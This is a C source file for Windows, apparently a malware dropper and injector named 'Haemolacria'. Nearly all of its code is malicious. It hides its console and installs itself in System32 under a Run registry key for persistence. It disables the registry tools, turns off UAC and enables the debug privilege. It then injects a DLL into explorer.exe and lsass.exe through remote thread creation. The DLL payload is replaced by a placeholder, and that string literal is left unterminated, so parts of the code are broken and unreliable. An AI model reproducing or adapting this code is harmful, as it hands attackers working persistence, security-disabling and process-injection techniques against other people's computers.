#include <Windows.h>
#include <TlHelp32.h>
//my condolences to anyone trying to read this
typedef NTSTATUS(NTAPI* NtCreateThreadExDef) (OUT LPHANDLE hThread, IN ACCESS_MASK DesiredAccess, IN PVOID ObjectAttributes, IN HANDLE ProcessHandle, IN PVOID lpStartAddress, IN PVOID lpParameter, IN ULONG Flags, IN SIZE_T StackZeroBits, IN SIZE_T SizeOfStackCommit, IN SIZE_T SizeOfStackReserve, OUT PVOID lpBytesBuffer);
typedef NTSTATUS(NTAPI* RtlCreateUserThreadDef) (IN HANDLE hProcess, IN LPVOID lpSecurityDescriptor, IN DWORD dwCreateSuspended, IN DWORD dwStackZeroBits, IN OUT LPDWORD lpStackReserved, IN OUT LPDWORD lpStackCommit, IN LPVOID lpStartAddress, IN LPVOID lpParam, OUT LPHANDLE lpThreadHandle , OUT LPDWORD dwThreadID);
typedef NTSTATUS(*RtlAdjustPrivilegeDef) (ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* NtSetInformationProcessDef) (HANDLE, DWORD, PVOID, DWORD);
VOID WriteHaemolacria() {
	const static BYTE Haemolacria[] = "you know wht you need to do!;
	DWORD dwAttribs = GetFileAttributesW(L"C:\\Windows\\Haemolacria.dll");
	HANDLE hFile = CreateFileW(L"C:\\Windows\\Haemolacria.dll", FILE_WRITE_ACCESS, NULL, NULL, CREATE_NEW, 0, NULL);
	WriteFile(hFile, Haemolacria, sizeof(Haemolacria), &dwAttribs, NULL);
	CloseHandle(hFile);
}

LPVOID CDECL lmemset(LPVOID dest, BYTE value, SIZE_T len) {
	for (INT i = 0; i < len; i++) ((BYTE*)dest)[i] = value;
	return dest;
}

DWORD LookupProcessByName(LPCWSTR lpProcessName) {
	DWORD dwProcessID = 0;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32W procEntry;
	procEntry.dwSize = sizeof(PROCESSENTRY32W);

	if (!Process32FirstW(hSnapshot, &procEntry)) goto failed;

	for (;;) {
		if (!Process32NextW(hSnapshot, &procEntry)) goto failed;
		else if (!lstrcmpW(lpProcessName, procEntry.szExeFile)) {
			dwProcessID = procEntry.th32ProcessID;
			break;
		}
		else continue;
	}

failed:
	if (!dwProcessID) SetLastError(ERROR_NOT_FOUND);
	return dwProcessID;
}

VOID main() {
	ShowWindow(GetConsoleWindow(), 0);
	WriteHaemolacria();
	const CHAR lpHaemoDLL[] = "Haemolacria.dll\0";
	/*HMODULE hHaemoDLL = LoadLibraryA(lpHaemoDLL);
	GetProcAddress(hHaemoDLL, "WhoAreYou")();*/
	HANDLE hKernel32 = GetModuleHandleW(L"kernel32.dll");
	HANDLE hNtdll = GetModuleHandleW(L"ntdll.dll");
	HANDLE hSTDOUT = GetStdHandle(STD_OUTPUT_HANDLE);
	FARPROC lpLoadLib = GetProcAddress(hKernel32, "LoadLibraryA");
	FARPROC lpLastErr = GetProcAddress(hKernel32, "GetLastError");
	DWORD dwDump;
	LPWSTR lpPrintfBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 512);

	WCHAR lpFilename[MAX_PATH];
	GetModuleFileNameW(NULL, lpFilename, MAX_PATH);
	CopyFileW(lpFilename, L"C:\\Windows\\System32\\hldr.exe", 1);
	HKEY hKey;
	RegCreateKeyW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
	RegSetValueExW(hKey, L"Haemolacria", NULL, REG_SZ, L"C:\\Windows\\System32\\hldr.exe", 58);
	RegCloseKey(hKey);
	dwDump = 1;
	RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hKey);
	RegSetValueExW(hKey, L"DisableRegistryTools", NULL, REG_DWORD, &dwDump, sizeof(DWORD));
	dwDump = 0;
	RegCloseKey(hKey);
	RegCreateKeyW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hKey);
	RegSetValueExW(hKey, L"EnableLUA", NULL, REG_DWORD, &dwDump, sizeof(DWORD));
	RegCloseKey(hKey);

	NtCreateThreadExDef NtCreateThreadEx = GetProcAddress(hNtdll, "NtCreateThreadEx");
	RtlCreateUserThreadDef RtlCreateUserThread = GetProcAddress(hNtdll, "RtlCreateUserThread");
	RtlAdjustPrivilegeDef RtlAdjustPrivilege = GetProcAddress(hNtdll, "RtlAdjustPrivilege");
	NtSetInformationProcessDef NtSetInformationProcess = GetProcAddress(hNtdll, "NtSetInformationProcess");
	RtlAdjustPrivilege(20, 1, 0, &dwDump);
	WriteConsoleW(hSTDOUT, "Got privs!\n", 11, NULL, NULL);

	DWORD dwMsPid = LookupProcessByName(L"explorer.exe");
	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_SET_INFORMATION, 0, dwMsPid);
	dwDump = 1;
	NtSetInformationProcess(hProcess, 29, &dwDump, sizeof(DWORD));
	LPVOID lpFarArguments = VirtualAllocEx(hProcess, NULL, sizeof(lpHaemoDLL), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	WriteProcessMemory(hProcess, lpFarArguments, lpHaemoDLL, sizeof(lpHaemoDLL), NULL);
	HANDLE hInjectDLL = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpLoadLib, lpFarArguments, 0, NULL);
	DWORD dwInjectDLLError;
	if (hInjectDLL) WaitForSingleObject(hInjectDLL, 2000);
	HANDLE hLasterrorThread = CreateRemoteThread(hProcess, NULL, 0, lpLastErr, NULL, 0, NULL);
	GetExitCodeThread(hLasterrorThread, &dwInjectDLLError);
	if (dwInjectDLLError == 8) {
		if (NtCreateThreadEx) NtCreateThreadEx(&hInjectDLL, THREAD_TERMINATE | THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION, NULL, hProcess, lpLoadLib, lpFarArguments, 0, NULL, NULL, NULL, NULL);
		else RtlCreateUserThread(hProcess, NULL, 0, 0, NULL, NULL, lpLoadLib, lpFarArguments, &hInjectDLL, NULL);
		Sleep(200);
		SuspendThread(hInjectDLL);
		ResumeThread(hInjectDLL);
		dwInjectDLLError = 0;
	}

	hInjectDLL = NULL;
	dwMsPid = LookupProcessByName(L"lsass.exe");
	hProcess = 0;
	
		hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ, 0, dwMsPid);
		DWORD shit = GetLastError();
		WCHAR* Ass = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 200);
		wsprintfW(Ass, L"lasterror: %u", shit);
		if (!hProcess) MessageBoxW(NULL, Ass, L"a", 0);
	
	lpFarArguments = VirtualAllocEx(hProcess, NULL, sizeof(lpHaemoDLL), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	WriteProcessMemory(hProcess, lpFarArguments, lpHaemoDLL, sizeof(lpHaemoDLL), NULL);
	hInjectDLL = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpLoadLib, lpFarArguments, 0, NULL);
	hLasterrorThread = CreateRemoteThread(hProcess, NULL, 0, lpLastErr, NULL, 0, NULL);
	GetExitCodeThread(hLasterrorThread, &dwInjectDLLError);
	//if (!hInjectDLL) {
		if (NtCreateThreadEx) NtCreateThreadEx(&hInjectDLL, THREAD_TERMINATE | THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION, NULL, hProcess, lpLoadLib, lpFarArguments, 0, NULL, NULL, NULL, NULL);
		else RtlCreateUserThread(hProcess, NULL, 0, 0, NULL, NULL, lpLoadLib, lpFarArguments, &hInjectDLL, NULL);
		Sleep(200);
		SuspendThread(hInjectDLL);
		ResumeThread(hInjectDLL);
		ExitProcess(0);
	//}
}
